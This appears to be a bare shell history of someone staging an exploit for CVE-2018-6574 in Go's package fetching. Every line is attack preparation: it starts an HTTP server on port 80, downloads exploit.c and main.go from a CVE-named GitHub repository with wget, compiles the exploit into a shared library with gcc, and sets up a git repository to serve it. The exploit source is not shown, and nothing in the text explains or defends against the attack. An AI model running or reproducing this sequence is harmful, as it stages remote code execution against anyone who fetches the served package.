python -m http.server 80
wget https://raw.githubusercontent.com/j4k0m/CVE-2018-6574/main/exploit.c
nano exploit.c 
fg
gcc -shared -o exp.so -fPIC exploit.c 
ls
wget https://raw.githubusercontent.com/j4k0m/CVE-2018-6574/main/main.go
nano main.go 
echo "# temp" >> README.md
git init
ls
